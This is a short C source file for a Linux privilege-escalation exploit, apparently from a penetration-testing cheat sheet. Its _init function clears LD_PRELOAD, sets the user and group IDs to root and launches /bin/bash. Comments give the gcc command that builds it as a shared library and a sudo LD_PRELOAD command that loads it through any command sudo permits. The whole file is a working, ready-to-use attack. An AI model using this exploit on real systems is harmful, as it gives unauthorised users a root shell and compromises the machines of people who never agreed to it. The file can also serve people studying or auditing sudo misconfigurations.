#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}

// To compile: gcc -fPIC -shared -o compiled_ld_preload.so ld_preload.c -nostartfiles
// Exploit: sudo LD_PRELOAD=/<path>/<to>/compiled_ld_preload.so <any_sudo-l_command>
